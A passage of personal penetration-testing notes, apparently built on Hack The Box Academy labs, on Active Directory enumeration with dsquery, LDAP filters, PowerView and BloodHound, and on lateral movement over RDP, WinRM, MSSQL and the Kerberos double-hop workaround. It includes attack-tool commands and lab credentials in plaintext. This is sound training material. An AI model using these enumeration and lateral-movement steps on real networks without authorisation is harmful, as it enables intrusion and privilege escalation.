dsquery user -email "john.doe@example.com"

# Find user accounts by department
dsquery user -dept "IT Department"

# Combining multiple criteria: find users by name and inactive status
dsquery user -name "John*" -inactive 4

```

**Computer Search**
```powershell
# Find all computer accounts in the domain
dsquery computer

# Find computer accounts by name, wildcard * can be used
dsquery computer -name "Server*"

# Find computer accounts by description
dsquery computer -desc "Web Server"

# Find computer accounts that have been inactive for a certain number of weeks
dsquery computer -inactive 4

# Find all disabled computer accounts
dsquery computer -disabled

# Find computer accounts in a specific organizational unit (OU)
dsquery computer "OU=Servers,DC=example,DC=com"

# Find computer accounts by operating system
dsquery computer -o "Windows Server 2016*"

# Find computer accounts by their location attribute
dsquery computer -loc "Building 1"

# Combining multiple criteria: find computers by name and inactive status
dsquery computer -name "Workstation*" -inactive 8
```

**Wildcard Search**
```powershell
# iew all objects in an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

```

**dsquery with LDAP search filters**
```powershell
# Users With Specific Attributes Set (PASSWD_NOTREQD)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Searching for Domain Controllers
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

# search for a disabled user with distinguishedName
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(distinguishedName=CN=Betty Ross,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL))" -attr distinguishedName userAccountControl description

# search for user in Administrators group and have the "PASSWD_NOTREQD" flag set
dsquery * -filter  (&(objectClass=user)(memberOf=CN=Administrators,CN=Builtin,DC=yourdomain,DC=com)(userAccountControl:1.2.840.113556.1.4.803:=32)) -attr distinguishedName userAccountControl description

# disabled account user with admin rights
dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description

```

#### LDAP Filtering Explained
- [LDAP Matching Rules](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4e638665-f466-4597-93c4-12f2ebfabab5)
- [UserAccountControl flags](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)


in `userAccountControl:1.2.840.113556.1.4.803:=8192`  

- in `userAccountControl` part we say we look in the userAccountControl object attributes the
- in `1.2.840.113556.1.4.803` part it is a `LDAP_MATCHING_RULE_BIT_AND` you can check [LDAP Matching Rules](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4e638665-f466-4597-93c4-12f2ebfabab5) used to match bit values with attributes
- in `8192` it is the decimal value for UserAccountControl attribute check  [UserAccountControl flags](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)


**Logical Operators**
- The operators `&` , `|` and `!` are used
- ` (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))` This would search for any user object that does NOT have the Password Can't Change attribute set.


# Active Directory Attacks
## Kerberos attacks 
Depending on your position in a network, this attack can be performed in multiple ways:
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

check [Kerberos attacks](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Kerberos%20attacks/README.md)

## Access Control List Abuse 

[ACLs-ACEs Abuse Attacks](https://github.com/kiro6/penetration-testing-notes/tree/main/Penetration%20Testing/ACLs-ACEs%20Abuse%20Attacks)

## Group Policy Object (GPO) Abuse

[Group Policy Object (GPO) Abuse](https://github.com/kiro6/penetration-testing-notes/tree/main/Penetration%20Testing/Group%20Policy%20Object%20(GPO)%20Abuse)





# Movement in AD

**Movment in AD can lead to:**
- Launch further attacks
- We may be able to escalate privileges and obtain credentials for a higher privileged user
- We may be able to pillage the host for sensitive data or credentials

## Privileged Access

### Remote Desktop
- if we have control of a local admin user on a given machine, we will be able to access it via RDP.
- sometimes we will get a foothold for a user that does not have local admin priv on any machine but does have the rights to `RDP` [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp) into one or more machines.
- `Remote Desktop Users` Group , which is a local group on every machine that contains the Users or Groups that can access this machine



#### Search for RDP access

Enumerating the `Remote Desktop Users` Group 
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"


ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound
![Screenshot 2024-07-04 at 20-27-13 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ddb4e7de-e7d9-415a-8e7c-9e065dfc3b4c)

Checking the current user Remote Access Rights using BloodHound
![Screenshot 2024-07-04 at 20-27-38 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/05be48b5-9837-4759-b571-cfaa2b87e510)


also we can check the Analysis in BloodHound tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`.

### PowerShell Remoting 
- if we got a foothold on a user that have [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote) on a machine we can access it
- `Remote Management Users` Group , which is a local group on every machine that contains the Users or Groups that can access this machine
- This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.  

#### Search for PowerShell Remoting access

Enumerating the `Remote Management Users` Group , which is a local group on every machine that contains the Users or Groups that can access this machine  
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
````

Using the Cypher Query in BloodHound
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
![Screenshot 2024-07-04 at 20-47-50 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/f1ff6b01-8b04-43f5-9a5b-386b3b95c411)

Establishing WinRM Session from Windows
```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

Establishing WinRM Session from Linux
```shell
evil-winrm -i 10.129.201.234 -u forend
```

### MSSQL Server
- It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance.
- We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying.
- Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.



Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
![Screenshot 2024-07-04 at 21-13-28 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/e95c334c-b9d6-48c1-8c32-edae87362f1a)


Enumerating MSSQL Instances with PowerUpSQL , [cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Invoke-SQLAudit -Verbose -Instance ZPH-SVRSQL01.ZSM.LOCAL -username "inlanefreight\damundsen"  -password "SQL1234!"
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

Enumerating MSSQL Instances with mssqlclient from Impacket toolkit.
```shell
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```


**check MSSQL attacks [here](https://github.com/kiro6/penetration-testing-notes/tree/main/Penetration%20Testing/Footprinting/Services#mssql)**

### SMB
if we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.




# Kerberos Double Hop Problem

Double Hop arise while using Kerberos to authenticate and you want to jumb from host to another, you only have a TGS in the memory to access a specfic service so there is no way to auth yourself to access other services 

![Screenshot 2024-07-05 at 00-01-39 Active Directory Enumeration   Attacks](https://github.com/kiro6/penetration-testing-notes/assets/57776872/168b3239-575a-4ea0-b929-5075a0cbdb85)



- authentication performed over `SMB` or `LDAP` means the user's NTLM Hash would be stored in memory. EX: PSExec
- when using `WinRM` through Kerberos to authenticate , the user's password is never cached as part of their login instead there will be a TGS
- If unconstrained delegation is enabled on a server, it is likely we won't face the "Double Hop" problem.

## Workarounds
[check this blog](https://posts.slayerlabs.com/double-hop/)

### PSCredential Object

```powershell
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

import-module .\PowerView.ps1
get-domainuser -spn -credential $Cred | select samaccountname
```

### Register PSSession Configuration

for this to work we need to be in windows env:
- we're on a domain-joined host and can connect remotely to another using WinRM
- we are working from a Windows attack host and connect to our target via WinRM using the Enter-PSSession cmdlet
- we need a full powershell session with gui to make it work


```powershell
# this have a Double Hop Problem
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm

# registering a new session configuration 
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```
